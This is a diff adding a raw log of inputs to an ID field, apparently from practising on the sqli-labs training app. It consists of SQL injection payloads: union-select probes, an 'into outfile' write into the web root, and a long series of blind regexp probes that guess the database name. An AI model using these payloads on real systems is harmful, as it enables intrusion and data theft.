@@ -1,0 +1,53 @@
+ID:0") union select 1,2,3 -- 
+ID:\ ==0") union select 1,2,3 -- 
+ID:\
+ID:1' union select 1,2,3 -- 
+ID:1
+ID:1
+ID:1\
+ID:1' union select 1,2,3 into outfile '/var/www/html/sqli-labs/Less-5/u.txt' -- 
+ID:1
+ID:1\
+ID:1
+ID:1\
+ID:1
+ID:1' and database() regexp '[a-z]*' -- 
+ID:1' and database() regexp '[^a-z]*' -- 
+ID:1' and database() regexp '[^a-z]*' -- 
+ID:1' and database() regexp '[a-z]' -- 
+ID:1' and database() regexp '[a-z]' -- 
+ID:1' and database() regexp '[^a-z]' -- 
+ID:1' and database() regexp '[a-z]' -- 
+ID:1' and database() regexp 'a[a-z]' -- 
+ID:1' and database() regexp 'b[a-z]' -- 
+ID:1' and database() regexp 'c[a-z]' -- 
+ID:1' and database() regexp 'ca[a-z]' -- 
+ID:1' and database() regexp 'cb[a-z]' -- 
+ID:1' and database() regexp 'cc[a-z]' -- 
+ID:1' and database() regexp 'cd[a-z]' -- 
+ID:1' and database() regexp 'ce[a-z]' -- 
+ID:1' and database() regexp 'cf[a-z]' -- 
+ID:1' and database() regexp 'cg[a-z]' -- 
+ID:1' and database() regexp 'cr[a-z]' -- 
+ID:1' and database() regexp 'ch[a-z]' -- 
+ID:1' and database() regexp 'ci[a-z]' -- 
+ID:1' and database() regexp 'cg[a-z]' -- 
+ID:1' and database() regexp 'ck[a-z]' -- 
+ID:1' and database() regexp 'cj[a-z]' -- 
+ID:1' and database() regexp 'cl[a-z]' -- 
+ID:1' and database() regexp 'cm[a-z]' -- 
+ID:1' and database() regexp 'c[x-y][a-z]' -- 
+ID:1' and database() regexp 'c' -- 
+ID:1' and database() regexp 'cr' -- 
+ID:1' and database() regexp 'cs' -- 
+ID:1' and database() regexp 'c' -- 
+ID:1' and database() regexp 'cu' -- 
+ID:1' and database() regexp 'cu[a-z]' -- 
+ID:1' and database() regexp '[a-z]cu[a-z]' -- 
+ID:1' and database() regexp '[^a-z]' -- 
+ID:1' and database() regexp '^[a-z]' -- 
+ID:1' and database() regexp '^c[a-z]' -- 
+ID:1' and database() regexp '^se[a-z]' -- 
+ID:1' and database() regexp '^[a-z]{9}' -- 
+ID:1' and database() regexp '^[a-z]{8}' -- 
+ID:1' and database() regexp '^[a-z]{1,9}' -- 
